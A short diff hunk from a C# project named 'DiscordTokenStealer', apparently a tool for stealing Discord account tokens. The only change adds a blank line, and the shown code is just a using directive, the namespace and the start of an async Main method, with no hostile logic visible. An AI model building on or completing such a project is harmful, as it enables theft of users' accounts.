@@ -2,6 +2,7 @@
 using DiscordTokenStealer.Discord;
 
 namespace DiscordTokenStealer;
+
 public static class Program
 {
     private static async Task Main()
